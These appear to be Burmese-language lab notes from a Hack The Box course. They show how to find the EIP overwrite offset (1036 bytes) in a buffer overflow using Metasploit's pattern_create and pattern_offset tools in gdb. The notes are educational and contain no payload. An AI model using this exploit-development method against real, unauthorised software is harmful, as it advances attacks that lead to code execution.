
Metasploit Framework က `pattern_create` ဆိုတဲ့ Ruby script ပါတယ်
ဒါက သတ်မှတ်ထားတဲ့ အလျားအတိုင်း unique string တစ်ခု ဖန်တီးပေး

```bash
K1ll3rRanger@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
K1ll3rRanger@htb[/htb]$ cat pattern.txt

Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9
```
`-l 1200` က pattern ရဲ့ အလျား 1200 bytes ကို သတ်မှတ်

```
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
```

```
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()
```

check `eip`
```
(gdb) info registers eip
eip            0x69423569   0x69423569
```

```
K1ll3rRanger@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569

[*] Exact match at offset 1036
```
Offset က `1036` bytes
နောက် 4 bytes က EIP ရဲ့ တန်ဖိုးကို သတ်မှတ်